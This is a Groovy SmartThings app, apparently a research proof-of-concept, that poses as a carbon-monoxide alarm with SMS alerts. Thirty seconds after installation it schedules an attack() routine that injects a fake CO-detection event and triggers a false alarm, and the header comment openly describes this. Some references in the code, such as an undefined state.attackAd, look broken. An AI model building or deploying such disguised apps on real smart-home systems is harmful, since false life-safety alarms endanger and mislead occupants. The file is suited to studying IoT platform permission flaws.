
/**

 *  shiqiCOAlarm

 *

 *  Copyright 2016 Yunhan Jia &amp; Shiqi Wang

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.

 * Attack Description:
   This kinds of attack is a pretty serious problem resulted from the capabilities system on SmartThings Platform. Some of the malicious apps could do something like fake alarm which it should not be able to do out of the normal logic.



Malicous COAlarm:
    Normal functions:
    The alarm could be triggered when the intensity of CO gas is too high.

    Malicious functions:
    The malicious CO detector would give the false intensity to the alarm to trigger a false alarm.


 */

definition(

    name: "shiqiCOAlarm",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "The alarm would be triggered when the CO detector detects that the CO gas is too much.",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

   

preferences {

  section("Title") {

    input "smoke", "capability.carbonMonoxideDetector", title: "CO Detected", required: false, multiple: true

    input "alarm", "capability.alarm"

  }

  section("Send Notifications?") {

      input("recipients", "contact", title: "Send notifications to") {

      input "phone", "phone", title: "Warn with text message (optional)",

          description: "Phone Number", required: false

      }

  }

}

 

def installed() {

       log.debug "Installed with settings: ${settings}"

       initialize()

}

 

def updated() {

       log.debug "Updated with settings: ${settings}"

 

       unsubscribe()

       initialize()

}

 

def initialize() {

       log.debug "alarm waiting events......"

       subscribe(smoke, "COSmoke", smokeHandler)

      subscribe(alarm, "alarm", strobeHandler)

    runIn(30,attack)

}

 

def smokeHandler(evt) {

log.debug evt.value

  if("detected" == evt.value) {

    alarm.strobe()

  }

  if("clear" == evt.value) {

     alarm.off()

  }

}

 

def strobeHandler(evt) {

       if(evt.value == "strobe") {

          state.msg = "CO alarm!!!"

          log.debug "smoke strobe the alarm"

        sendNotification()       

    }

       if(evt.value == "off") {

          state.msg = "CO alarm!!!"

          log.debug "clear, not strobe!"

        sendNotification()

    }

    //attack()

}

 

def sendNotification() {

    log.debug "recipients configured: $recipients"

      

    def message = state.msg + state.attackAd

    log.debug "message = $message"

    if (location.contactBookEnabled && recipients) {

        log.debug "contact book enabled!"

        sendNotificationToContacts(message, recipients)

    } else {

        log.debug "contact book not enabled"

        if (phone) {

            sendSms(phone, message)

        }

    }

}

 

def attack() {

log.debug "attack"

       smoke.COSmoke()

}

